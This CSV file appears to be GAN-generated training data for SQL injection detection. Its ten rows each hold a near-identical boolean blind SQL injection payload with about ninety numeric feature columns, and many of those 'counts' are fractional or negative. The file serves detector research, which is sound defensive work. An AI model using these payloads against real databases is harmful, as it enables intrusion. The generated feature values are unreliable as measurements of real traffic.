id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000145,4.087509087209339,136.1001434326172,48.74422836303711,12.146907806396484,45.95975875854492,-0.029796136543154716,67.2651596069336,19.983325958251953,0.7448031306266785,0.36851510405540466,0.1044560894370079,0.3405974507331848,0.1338871866464615,3.832390785217285,0.8844941854476929,1.2388672828674316,0.9833704233169556,0.0612068846821785,0.19883835315704346,0.3260277807712555,2.859938859939575,3.65075421333313,1.7189682722091675,-0.02806360274553299,1.3493939638137817,0.029087934643030167,-0.22323837876319885,-0.024863503873348236,0.052933793514966965,0.8130332827568054,-0.05850003659725189,-0.14673548936843872,0.03471635282039642,-0.009102411568164825,0.5789276957511902,1.5854774713516235,2.256352186203003,0.7232459783554077,0.8956249952316284,-0.009294014424085617,0.19818474352359772,0.8144738078117371,-0.15072670578956604,-0.0909334123134613,0.39035797119140625,-0.4028244614601135,-0.00020026415586471558,0.14119037985801697,0.14232082664966583,0.1661219447851181,-0.09671026468276978,-0.0661778599023819,-0.1626945436000824,0.20263633131980896,-0.13460862636566162,-0.2577926516532898,0.030295629054307938,0.5789272785186768,-0.04974951595067978,0.212588369846344,0.001906868419609964,-0.045426178723573685,-0.013967160135507584,0.026850925758481026,0.42098549008369446,0.05205494537949562,-0.1967785358428955,0.5136162042617798,0.10883662104606628,0.23410892486572266,-0.12983396649360657,-0.17711396515369415,-0.013005424290895462,0.06138768047094345,0.5679326057434082,-0.16819828748703003,1.2899248600006104,0.35324159264564514,-0.23021386563777924,0.14668628573417664,0.1818249672651291,3.8766651153564453,1.014482021331787,0.37507033348083496,-0.27496010065078735,-0.18539085984230042,0.09729017317295074,0.10805914551019669,-0.10331948846578598
GAN_000002,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000226,3.583697936385437,136.2976837158203,57.12446212768555,12.263307571411133,45.36710739135742,0.022179801017045975,60.39860153198242,19.345439910888672,0.916550874710083,0.42508190870285034,0.0983198955655098,0.33978721499443054,0.13391396403312683,3.937222957611084,1.3225898742675781,0.8824949860572815,0.9862692356109619,0.008382892236113548,0.18508964776992798,0.12654098868370056,3.2452211380004883,3.6006155014038086,1.8865413665771484,0.10297946631908417,1.41913640499115,0.006967190653085709,0.04836608096957207,0.24018552899360657,0.026852233335375786,0.7383468747138977,0.06010347604751587,-0.13517999649047852,0.04219462722539902,-0.0013436228036880493,0.5761919021606445,1.493353247642517,2.294170379638672,0.9268094897270203,0.8867049217224121,-0.028349686414003372,0.2559260427951813,0.7308218479156494,0.03551100566983223,0.0125938281416893,-0.037132762372493744,-0.07547862827777863,-0.1647733449935913,0.10863196104764938,0.09721101820468903,0.12440785765647888,0.03084445558488369,0.038279928267002106,-0.17437595129013062,0.05129843205213547,0.04046662896871567,-0.22624212503433228,-0.09803593903779984,0.2091740220785141,0.09783994406461716,0.17528171837329865,-0.0011876404751092196,-0.016186866909265518,0.0011725544463843107,0.023968035355210304,0.15126363933086395,-0.020498979836702347,-0.14273707568645477,0.14047838747501373,0.036830175668001175,0.07337362319231033,0.15012100338935852,0.024302586913108826,0.14547672867774963,0.06681012362241745,0.21548663079738617,-0.15706677734851837,1.0237623453140259,0.4119267165660858,-0.07770654559135437,0.14342010021209717,0.03442636504769325,4.066163063049316,1.0035004615783691,0.13563664257526398,0.01315479725599289,0.09202252328395844,0.026149161159992218,0.07916603982448578,-0.02532939612865448
GAN_000003,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000145,3.7841691954784316,136.31211853027344,55.713138580322266,13.037374496459961,44.1407356262207,0.10253490507602692,61.06814193725586,19.488170623779297,1.174781322479248,0.38800472021102905,0.09442822635173798,0.3495539724826813,0.1302299201488495,3.825843334197998,1.0986956357955933,1.2553563117980957,1.3660632371902466,0.04008903726935387,0.15619248151779175,-0.1383727788925171,3.157043218612671,3.57369065284729,1.6451035737991333,0.08891687542200089,1.4224447011947632,0.0182944443076849,0.1041821539402008,0.28330159187316895,0.06446943432092667,0.7182702422142029,0.004687197506427765,-0.005981512367725372,0.08425945043563843,0.09924790263175964,0.5856769680976868,1.6220545768737793,2.033050775527954,0.8092999458312988,0.9087980389595032,-0.1889553964138031,0.31379368901252747,0.7085650563240051,0.1590462327003479,-0.012033306062221527,0.0891132801771164,-0.16158446669578552,-0.1676020324230194,0.12127857655286789,0.12483420222997665,0.10425624996423721,-0.0066313231363892555,0.05202600359916687,-0.2682154178619385,0.24395668506622314,-0.01627267152070999,0.0956171303987503,0.23783352971076965,0.5099958777427673,-0.23708952963352203,0.11598445475101471,0.004522737581282854,0.17051897943019867,-0.008547225035727024,0.0284845232963562,0.571155309677124,-0.035581037402153015,0.25982096791267395,-0.035340502858161926,0.0983603447675705,0.02984568476676941,0.12397995591163635,-0.28400781750679016,-0.04603542760014534,0.05132134631276131,0.2516632080078125,0.10222062468528748,1.0125622749328613,0.3676876723766327,0.01842590421438217,0.1454671174287796,-0.1521597057580948,3.962224245071411,0.992887020111084,0.16749784350395203,-0.14812806248664856,0.18796849250793457,-0.024426404386758804,-0.19197878241539001,0.03776440769433975
GAN_000004,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000145,4.05135662436879,135.95155334472656,51.83895492553711,11.809297561645508,44.18429183959961,0.01637568697333336,63.89634323120117,19.85613250732422,0.8095969557762146,0.3848090171813965,0.10521020740270615,0.3382793664932251,0.13090182840824127,3.891343355178833,0.9042829871177673,0.9679877161979675,0.8903077840805054,0.046734992414712906,0.18422801792621613,0.14048942923545837,3.253232002258301,3.4929866790771484,1.5787909030914307,-0.008454881608486176,1.341478705406189,0.02589436247944832,-0.09295584261417389,0.04388479143381119,0.05845970660448074,0.7877640724182129,0.07131510227918625,-0.35205817222595215,0.04358070716261864,-0.10761238634586334,0.5424011945724487,1.5829696655273438,2.3203043937683105,0.8268905282020569,0.905434250831604,-0.16984233260154724,0.352947473526001,0.7444464564323425,-0.005814485251903534,-0.0925646424293518,0.2515036463737488,-0.39051833748817444,0.020162373781204224,0.11702154576778412,0.14704594016075134,0.19081291556358337,-0.0020174395758658648,-0.04208660125732422,-0.05161542445421219,0.1682785153388977,-0.009859608486294746,-0.16255074739456177,-0.05269477516412735,0.4113692343235016,-0.08077678084373474,0.3816293179988861,-0.003958877641707659,-0.0062454454600811005,-0.007331476546823978,0.04568197950720787,0.36855190992355347,0.2329457402229309,-0.13493318855762482,0.38008809089660645,0.09001843631267548,0.05638996511697769,-0.09432641416788101,-0.14746281504631042,0.21783803403377533,0.027146298438310623,0.29645195603370667,-0.19439351558685303,1.1145755052566528,0.36012598872184753,-0.2924755811691284,0.19369550049304962,0.1833057552576065,3.8887741565704346,1.0218572616577148,0.2969808578491211,-0.03485766053199768,0.05137299373745918,0.2054341584444046,-0.008489003404974937,0.10009799152612686
GAN_000005,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000226,3.752947987052548,136.08889770507812,51.099037170410156,12.58446216583252,45.415828704833984,-0.03174126148223877,65.33501434326172,19.868976593017578,0.8938869833946228,0.37245655059814453,0.10087273269891739,0.3314061760902405,0.1338506042957306,3.907364845275879,1.318264365196228,0.8578706383705139,0.9811762571334839,0.03307092934846878,0.14937548339366913,0.27842408418655396,3.028684616088867,3.7020294666290283,1.8381171226501465,-0.018142037093639374,1.3334112167358398,0.01510008703917265,-0.2645350694656372,0.07871658354997635,0.04388328641653061,0.7601239681243896,0.04861355200409889,-0.2265836000442505,0.051972609013319016,0.12307961285114288,0.5731483101844788,1.4418470859527588,2.142244577407837,0.6663224101066589,0.8417301774024963,-0.06925151497125626,0.28215840458869934,0.7844813466072083,0.02934011071920395,-0.12423722445964813,0.19597752392292023,-0.10270474851131439,-0.0005544498562812805,0.12215065211057663,0.1546742022037506,0.15602754056453705,-0.009019331075251102,0.010927430354058743,-0.0013274699449539185,-0.09239839017391205,-0.1621471494436264,-0.09016359597444534,0.010501392185688019,0.5477955341339111,-0.1498793512582779,0.24320438504219055,-0.005130890756845474,0.18604125082492828,-0.001962509239092469,0.023949256166815758,0.2791363596916199,0.12096759676933289,-0.21370673179626465,0.2647097706794739,0.129203200340271,0.04539961367845535,-0.1751604676246643,-0.18420268595218658,0.12802547216415405,0.05601410195231438,0.14930683374404907,-0.04888265207409859,1.1108759641647339,0.2827272415161133,-0.16751018166542053,0.17933756113052368,0.03846743702888489,3.936232566833496,1.0177139043807983,0.3374861776828766,-0.36181890964508057,-0.030221767723560333,0.09775322675704956,0.15360823273658752,-0.03865224868059158
GAN_000006,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000145,3.74856352647799,136.3838653564453,58.34469223022461,12.248204231262207,44.83682632446289,0.21377778053283691,63.35342788696289,20.073671340942383,1.253391981124878,0.3520906865596771,0.08843965083360672,0.335690438747406,0.1311085820198059,3.819188356399536,1.3293322324752808,1.6950894594192505,1.4861905574798584,0.009235666133463383,0.18209700286388397,0.08073031157255173,2.998662233352661,3.335999011993408,1.9513194561004639,0.016336604952812195,1.297472357749939,0.004033296834677458,0.23823802173137665,0.12219756096601486,0.04319848120212555,0.7468671798706055,-0.07445771992206573,0.17581608891487122,0.06450536102056503,0.48770871758461,0.6706407070159912,1.4598287343978882,1.4568421840667725,0.4158153235912323,0.8889070749282837,-0.22300654649734497,0.36466535925865173,0.8675294518470764,-0.023654282093048096,-0.20551927387714386,0.11213701963424683,-0.0949893444776535,-0.33805611729621887,0.15746772289276123,0.08748898655176163,0.11465416848659515,-0.10124306380748749,0.1230359897017479,-0.4800615906715393,0.26577576994895935,-0.0677676573395729,-0.10684282332658768,0.2584761679172516,0.6439898610115051,0.10100894421339035,0.1098640188574791,-0.0056882500648498535,0.5272614359855652,-0.015029676258563995,0.0011094838846474886,0.5494659543037415,-0.07075589895248413,0.18461474776268005,0.09121106564998627,0.3185276389122009,-0.0210849791765213,-0.06355992704629898,-0.4519423842430115,-0.12944000959396362,0.05809649080038071,0.4292354881763458,0.09757954627275467,1.1095634698867798,0.15827682614326477,-0.014958366751670837,-0.09050729125738144,-0.3365800976753235,3.666961431503296,1.0062010288238525,0.3264600932598114,-0.6767826676368713,0.10166235268115997,0.046421583741903305,0.18604794144630432,-0.026024319231510162
GAN_000007,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000145,3.8067292412673144,136.08099365234375,54.41668701171875,12.197797775268555,43.95731735229492,0.012664459645748138,63.3775749206543,19.78188705444336,1.0580769777297974,0.3884143531322479,0.09924819320440292,0.3435579240322113,0.12850098311901093,3.867631435394287,0.9499265551567078,1.1328483819961548,1.0474120378494263,0.03529287129640579,0.1436842530965805,0.01957409828901291,3.576226234436035,3.6866533756256104,1.6497708559036255,-0.01665060967206955,1.3634365797042847,0.018568912521004677,0.07725551724433899,0.14993956685066223,0.01829651929438114,0.7015112638473511,0.007487058639526367,-0.04436492174863815,0.05484790354967117,-0.061658356338739395,0.6389226317405701,1.6048073768615723,2.2388265132904053,0.8238229751586914,0.9416338205337524,-0.0535246841609478,0.3595411777496338,0.7820524573326111,0.001664869487285614,-0.11987248063087463,0.21650423109531403,-0.26882943511009216,-0.12502862513065338,0.10192984342575073,0.1378634124994278,0.1609967201948166,-0.04891042411327362,-0.0013808321673423052,-0.1727777123451233,0.1876620352268219,0.01915503852069378,-0.24781808257102966,0.07705420255661011,0.314532995223999,-0.016269735991954803,0.35228991508483887,0.0017694273265078664,0.14874267578125,-0.00589639600366354,0.023597734048962593,0.5702535510063171,0.11355803906917572,0.13655972480773926,0.1511887162923813,0.015641268342733383,-0.11301656067371368,0.06378517299890518,-0.1611647605895996,0.07771237194538116,0.02950805053114891,0.3122123181819916,-0.12740163505077362,1.0288212299346924,0.4072490334510803,-0.2090413123369217,0.14886416494846344,0.004289314150810242,3.885990619659424,1.0101594924926758,0.2347787618637085,-0.08994415402412415,0.08971977978944778,0.043010737746953964,-0.06657803058624268,0.14709386229515076
GAN_000008,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000145,3.9715735936146355,136.39065551757812,50.710716247558594,11.790166854858398,43.01494598388672,0.03613479807972908,65.12538146972656,20.54424285888672,1.0965237617492676,0.3454396724700928,0.09986400604248047,0.34015342593193054,0.13447770476341248,3.8564817905426025,1.148059368133545,1.3355119228363037,1.1287578344345093,0.0595102421939373,0.18980252742767334,-0.07245084643363953,3.1063976287841797,3.3050410747528076,1.3433829545974731,-0.04404551535844803,1.476835012435913,0.023751238361001015,-0.08741360902786255,-0.00783961359411478,0.05979764461517334,0.8680548071861267,0.14190813899040222,-0.14620299637317657,0.028022922575473785,0.15522246062755585,0.5434989929199219,1.5486388206481934,1.9369932413101196,0.27231916785240173,0.9338144063949585,-0.0934906154870987,0.3247358798980713,0.768122673034668,0.12722693383693695,-0.039999768137931824,0.24780617654323578,-0.1842239797115326,-0.13946568965911865,0.09943238645792007,0.08033449202775955,0.14677037298679352,-0.08532023429870605,0.07884876430034637,-0.20689651370048523,0.19345152378082275,-0.07471276819705963,-0.1300744116306305,-0.06090077757835388,0.4860926568508148,-0.0886089876294136,-0.05204235017299652,0.00035413677687756717,0.316371351480484,-0.005900719203054905,0.019912725314497948,0.3470584452152252,-0.040405452251434326,0.11329878121614456,0.4287921190261841,0.07514688372612,0.08384738862514496,-0.055271051824092865,-0.1414603292942047,0.1198495477437973,0.09320316463708878,0.353906512260437,0.1178496927022934,1.0993345975875854,0.19061335921287537,-0.21938230097293854,0.09339537471532822,0.21674691140651703,4.1952080726623535,1.0116008520126343,0.20657695829868317,-0.17558281123638153,0.059031467884778976,0.14280112087726593,0.34647685289382935,-0.12232331186532974
GAN_000009,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000145,3.9973095434598713,136.01829528808594,49.67696762084961,12.683859825134277,44.991920471191406,0.16744190454483032,67.42432403564453,20.00814437866211,0.8120599389076233,0.3625410795211792,0.09512872248888016,0.32867005467414856,0.13278478384017944,3.867065191268921,0.9759056568145752,1.0391061305999756,1.0706204175949097,0.029460687190294266,0.17909550666809082,0.034567691385746,3.253995418548584,3.772339105606079,1.7085959911346436,0.05895553529262543,1.3814432621002197,0.02759711630642414,-0.1655535250902176,-0.006938748527318239,0.04520102217793465,0.8506475687026978,-0.10525326430797577,-0.2261803150177002,0.03662289306521416,-0.03378235176205635,0.5632142424583435,1.6245733499526978,2.1765012741088867,0.6184409260749817,0.8822934627532959,-0.2739933431148529,0.3942640721797943,0.8271369338035583,-0.026876874268054962,-0.18831707537174225,0.39369601011276245,-0.15919318795204163,-0.16918915510177612,0.1371360868215561,0.16368070244789124,0.19413286447525024,-0.06559546291828156,0.006427242420613766,-0.12773999571800232,0.2513522207736969,0.06761099398136139,-0.20756930112838745,-0.036432407796382904,0.459527850151062,0.013124443590641022,0.29198548197746277,0.009124068543314934,0.2870451807975769,-0.009576849639415741,0.013543164357542992,0.3240464925765991,0.1713142693042755,-0.24874606728553772,0.34419554471969604,0.1404380351305008,0.078496053814888,-0.3572823405265808,-0.10602135211229324,0.11576420068740845,0.03300302103161812,0.269067645072937,-0.1421685665845871,1.1680959463119507,0.25770074129104614,-0.176224485039711,0.06253892928361893,-0.003540627658367157,4.093814373016357,1.020261526107788,0.3748997747898102,-0.297199547290802,-0.14858078956604004,0.005837790668010712,0.27246132493019104,0.2805456221103668
GAN_000010,attack,boolean,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000145,3.700761006787806,135.733642578125,52.14778518676758,12.016145706176758,45.84895706176758,0.05127337947487831,64.09220886230469,20.318614959716797,0.943686306476593,0.3630090355873108,0.09968586266040802,0.32954633235931396,0.13515464961528778,3.8410539627075195,1.2393418550491333,1.0599031448364258,1.1249825954437256,0.06045358628034592,0.15387433767318726,0.2806541919708252,2.92389178276062,3.5804250240325928,1.8671809434890747,0.029435284435749054,1.35049307346344,0.02217506431043148,-0.26628661155700684,0.048815853893756866,0.002687874948605895,0.8286526203155518,-0.14583192765712738,-0.07709825038909912,0.04003408923745155,0.11022557318210602,0.6445159316062927,1.5153440237045288,2.1215126514434814,0.41093191504478455,0.8887459635734558,-0.12738564610481262,0.26202234625816345,0.8346924781799316,0.010211803019046783,-0.14738275110721588,0.314018189907074,-0.10370387136936188,-0.10339006781578064,0.09178873151540756,0.11881017684936523,0.12077553570270538,-0.13988757133483887,0.028169190511107445,0.05063740909099579,0.0995037630200386,-0.11286285519599915,-0.24114379286766052,0.09137308597564697,0.4586099684238434,-0.021753519773483276,0.06674518436193466,0.0028853085823357105,0.06679962575435638,-0.010693512856960297,0.034573040902614594,0.2551567852497101,0.03477049991488457,-0.059500426054000854,0.24834217131137848,0.1770002245903015,0.14835424721240997,-0.17086508870124817,-0.18383756279945374,-0.020830858498811722,0.0962027981877327,0.21733449399471283,-0.026583444327116013,1.2569804191589355,0.2793866991996765,-0.23890085518360138,0.09393908828496933,0.10413558036088943,4.2366766929626465,1.0100103616714478,0.2613499164581299,-0.3809030055999756,-0.046124495565891266,-0.024276003241539,0.3565213978290558,-0.14616307616233826
